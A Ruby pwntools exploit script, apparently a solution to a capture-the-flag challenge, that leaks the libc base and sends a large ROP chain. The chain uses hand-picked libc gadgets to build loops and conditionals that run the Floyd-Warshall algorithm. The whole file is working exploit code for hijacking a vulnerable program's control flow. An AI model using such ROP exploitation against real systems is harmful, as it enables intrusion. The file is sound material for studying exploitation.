#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '111.186.63.203', 6666
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

z.gets 'malloc address: '
@libc = z.gets.to_i(16) - 0x97070
def libc; @libc; end

def add_rax_rcx; libc + 0x0ab9f8; end
def mov_prcx_rdx; libc + 0x17f030; end # mov qword ptr [rcx], rdx ; ret
def mov_q_rax_0; libc + 0x143961; end # mov qword ptr [rax], 0 ; ret
def mov_rax_prax; libc + 0x145c98; end # mov rax, qword ptr [rax] ; ret
def mov_rax_rdx; libc + 0x52c59 ; end # mov rax, rdx ; ret
def mov_rdx_rax; libc + 0x1415dd; end # mov rdx, rax ; ret
def pop_rax; libc + 0x439c8; end
def pop_rbx; libc + 0x2cb49; end
def pop_rcx; libc + 0x3eb0b; end
def pop_rdi; libc + 0x2155f; end
def pop_rdx; libc + 0x1b96 ; end
def pop_rsi; libc + 0x23e6a; end
def ret; libc + 0x8aa; end
def sub_rax_rdi; libc + 0x0b17b8; end # sub rax, rdi ; ret


def reg_addr
  @cnt ||= -1
  buffer = 0x61a080
  @cnt += 1
  buffer + @cnt * 8
end

@tmp_at = reg_addr
# let tmp large enough
15.times { reg_addr }

def add_rax_rdx
  # 0x00000000000b17b5 : add rax, rdx ; sub rax, rdi ; ret
  flat(pop_rdi, 0, libc + 0xb17b5)
end

# Breaks:
#   rax, rbx, rbp, r12, r13, r14
def mov_rcx_rax
  # 9d1b0:	mov    rcx,rax
  # 9d1b3:	jmp    9d178 <__libc_scratch_buffer_grow_preserve@@GLIBC_PRIVATE+0x38>
  # --
  # 9d178:	mov    QWORD PTR [rbx],rcx
  # 9d17b:	mov    QWORD PTR [rbx+0x8],rbp
  # 9d17f:	mov    eax,0x1
  # 9d184:	pop    rbx
  # 9d185:	pop    rbp
  # 9d186:	pop    r12
  # 9d188:	pop    r13
  # 9d18a:	pop    r14
  # 9d18c:	ret    
  flat(pop_rbx, @tmp_at, libc + 0x9d1b0, [0] * 5)
end

# Breaks: rdi
def fetch_at(addr)
  # 0x00000000000e0010 : mov rax, qword ptr [rdi + 0x20] ; ret
  flat(pop_rdi, addr - 0x20, libc + 0xe0010)
end

def compare(a_at, b_at)
  # rax = *a_at >=< *b_at
  # return b - a
  +''.tap do |s|
    s << fetch_at(a_at)
    s << mov_rcx_rax
    s << fetch_at(b_at)
    # 1923da:	cmp    rcx,rax
    # 1923dd:	jne    192403 <__nss_group_lookup@GLIBC_2.2.5+0x286c3>
    # 1923df:	xor    eax,eax
    # 1923e1:	ret    
    # --
    # 192403:	cmp    ecx,eax
    # 192405:	jne    192416 <__nss_group_lookup@GLIBC_2.2.5+0x286d6>
    # 192407:	shr    rcx,0x20
    # 19240b:	shr    rax,0x20
    # 19240f:	cmp    ecx,eax
    # 192411:	jne    192416 <__nss_group_lookup@GLIBC_2.2.5+0x286d6>
    # 192413:	xor    eax,eax
    # 192415:	ret    
    # 192416:	mov    eax,0x1
    # 19241b:	jl     192420 <__nss_group_lookup@GLIBC_2.2.5+0x286e0>
    # 19241d:	neg    eax
    # 19241f:	ret    
    # 192420:	ret    
    s << flat(libc + 0x1923da)
    # convert 0xffffffff -> -1
    # 0x000000000018a104 : movsxd rax, ecx ; ret
    s << flat(mov_rcx_rax, libc + 0x18a104)
  end
end

def less(a_at, b_at)
  # rax = *a_at < *b_at
  +''.tap do |s|
    tmp = reg_addr
    2.times { reg_addr }
    tmp2 = reg_addr
    log.dump tmp.hex

    s << compare(a_at, b_at)
    s << store_rax_at(tmp2)
    s << flat(pop_rax, tmp, mov_q_rax_0)
    s << flat(pop_rax, tmp + 8, mov_q_rax_0)
    s << flat(pop_rax, tmp + 0x10, mov_q_rax_0)
    s << inc(tmp + 0x10)
    # -1, 0, 1 => 0, 0, 1
    s << inc(tmp2)
    s << get_map_val(tmp, tmp, tmp2)
  end
end

def inc(at)
  # 0x0000000000118dd0 : inc dword ptr [rax] ; ret
  flat(pop_rax, at, libc + 0x118dd0)
end

# Breaks: rcx, rdx
# eax *= val
def mul(val)
  # imul: //OperandSize == 32 EDX:EAX = EAX * Source
  # 0x00000000000fd317 : imul dword ptr [rcx] ; ret
  tmp = reg_addr
  flat(store(val, tmp), pop_rcx, tmp, libc + 0xfd317)
end

# Breaks: rdx
def neg
  isub_rax(0)
end

# Breaks: rdx
# rax = val - rax
def isub_rax(val)
  # d0423:	sub    rdx,rax
  # d0426:	jbe    d0460 <wcstof128@@GLIBC_2.26+0x500>
  # d0428:	add    rax,rdi
  # d042b:	ret    
  #  --
  # d0460:	xor    eax,eax
  # d0462:	ret    
  # 0x0000000000052c59 : mov rax, rdx ; ret
  flat(pop_rdx, val, libc + 0xd0423, libc + 0x52c59)
end

# Breaks: rcx, rdx
# Keeps rax unchanged!
def store(val, at)
  flat(pop_rcx, at, pop_rdx, val, mov_prcx_rdx)
end

# Breaks: a lot!
# $rsp = rsp_when_this_method_ends + $rax
def add_rsp_rax
  # 0x00000000001d6658 : or rsi, rsp ; jmp qword ptr [rcx]
  # 0x00000000000ac21c : add rax, rsi ; ret
  # # mov_rcx_rax
  # 0x000000000011f7ff : test eax, eax ; cmove eax, edx ; ret
  # 0x0000000000086bb0 : cmove r8, rcx ; ret
  # 0x000000000003eca9 : mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
  +''.tap do |s|
    tmp = reg_addr
    s << store(ret, tmp)
    s << flat(pop_rcx, tmp, pop_rsi, 0, libc + 0x1d6658)
    offset = s.size
    body_size = 0xe8
    # $rsi = $orig_rsp + offset
    s << flat(pop_rcx, body_size - offset, add_rax_rcx) # $rax += remain_body_size
    s << flat(libc + 0xac21c) # $rax = $rax + body_size + $orig_rsp
    s << mov_rcx_rax
    s << flat(pop_rax, 0, libc + 0x11f7ff, libc + 0x86bb0) # r8 = rcx
    s << flat(pop_rdx, ret, libc + 0x3eca9)
    # log.dump s.size.hex
    fail if s.size != body_size
  end
end

# 0x00000000000d9ff2 : add qword ptr [r8 - 0x7d], rcx ; ret
# 0x00000000000e77fd : add qword ptr [r9 - 0x77], rcx ; ret
# 0x0000000000069b70 : mov r8, qword ptr [rbp - 0x520] ; jmp rax
# 0x0000000000069f19 : mov r8, rcx ; mov r15d, 1 ; jmp rax
# 0x000000000003ecac : mov rbp, r9 ; nop ; jmp rdx
# 0x000000000005343e : mov qword ptr [rdi + 0x10], r9 ; ret

# Breaks: rdi
def store_rax_at(at)
  # 0x000000000008dd76 : mov qword ptr [rdi + 8], rax ; ret
  flat(pop_rdi, at - 8, libc + 0x8dd76)
end

# Breaks: a lot
def backup_rsp(at)
  # 0x00000000001d6658 : or rsi, rsp ; jmp qword ptr [rcx]
  # 0x00000000000ac21c : add rax, rsi ; ret
  +''.tap do |s|
    tmp = reg_addr
    s << store(ret, tmp)
    s << flat(pop_rcx, tmp, pop_rsi, 0, libc + 0x1d6658) # $rsi = $rsp
    offset = 6 * 8
    s << flat(pop_rax, offset, libc + 0xac21c) # $rax = $rsi + offset
    s << store_rax_at(at)
  end
end

def resume_rsp(at)
  # 0x000000000011f7ff : test eax, eax ; cmove eax, edx ; ret
  # 0x0000000000086bb0 : cmove r8, rcx ; ret
  # 0x000000000003eca9 : mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
  +''.tap do |s|
    s << fetch_at(at)
    s << mov_rcx_rax
    s << flat(pop_rax, 0, libc + 0x11f7ff, libc + 0x86bb0) # r8 = rcx
    s << flat(pop_rdx, ret, libc + 0x3eca9)
  end
end

def iff(condition_rop, true_rop)
  +''.tap do |s|
    s << condition_rop
    # if rax == 1: true_rop
    # else: fall through
    s << flat(isub_rax(1), mul(true_rop.size))
    # if rax == 1: rax = 0
    # else: rax = true_rop.size
    s << add_rsp_rax
    s << true_rop
  end
end

def rep(i_at, n_at)
  # iff(i_at, n_at)
  +''.tap do |s|
    s << flat(pop_rax, i_at, mov_q_rax_0) # i = 0
    # head of for loop
    tmp = reg_addr
    s << backup_rsp(tmp)
    s << yield # body
    s << inc(i_at)
    # compare: if i < n; rax = 1
    s << iff(compare(i_at, n_at), resume_rsp(tmp))
  end
end

# Breaks: rcx, rdx
def get_map_at(map_at, i_at, j_at)
  # map_at + (*i_at * 64 + *j_at) * 8
  tmp = reg_addr
  +''.tap do |s|
    s << fetch_at(i_at)
    s << mul(64)
    s << mov_rcx_rax
    s << fetch_at(j_at)
    s << flat(add_rax_rcx)
    s << mul(8)
    s << flat(pop_rcx, map_at, add_rax_rcx)
  end
end

def get_map_val(map_at, i_at, j_at)
  +''.tap do |s|
    s << get_map_at(map_at, i_at, j_at)
    s << flat(mov_rax_prax)
  end
end

def floyd(n_at, map)
  i_at = reg_addr
  j_at = reg_addr
  k_at = reg_addr
  log.dump [i_at, j_at, k_at].map(&:hex)
  rep(i_at, n_at) {
    rep(j_at, n_at) {
      rep(k_at, n_at) {
        # if map[j][i] + map[i][k] < map[j][k]
        #   map[j][k] = map[j][i] + map[i][k]
        +''.tap do |s|
          s << flat(libc + 0xb17c5) # easier to debug
          a = reg_addr
          c = reg_addr
          s << get_map_val(map, j_at, i_at) << store_rax_at(a)
          s << get_map_val(map, i_at, k_at)
          s << mov_rcx_rax << fetch_at(a)
          s << flat(add_rax_rcx) << store_rax_at(a)

          s << get_map_val(map, j_at, k_at) << store_rax_at(c)
          # 0x00000000000443f8 : xor eax, ecx ; ret
          log.dump [a.hex, c.hex]
          s << iff(less(a, c), flat(
            flat(libc + 0x443f8), # for debug
            get_map_at(map, j_at, k_at),
            mov_rcx_rax,
            fetch_at(a),
            mov_rdx_rax,
            mov_prcx_rdx,
          ))
        end
      }
    }
  }
end

payload = flat(0, 0, rbp=0)

n = 0x602060
mat = 0x602068
payload << floyd(n, mat)

# crash
payload << flat(0xdeadbeef)

log.dump payload.size
fail if payload.size > 65536
z.write payload.ljust(65536, "\x00")
z.interact

# flag{for_k_in_N_for_i_in_N_for_j_in_N}
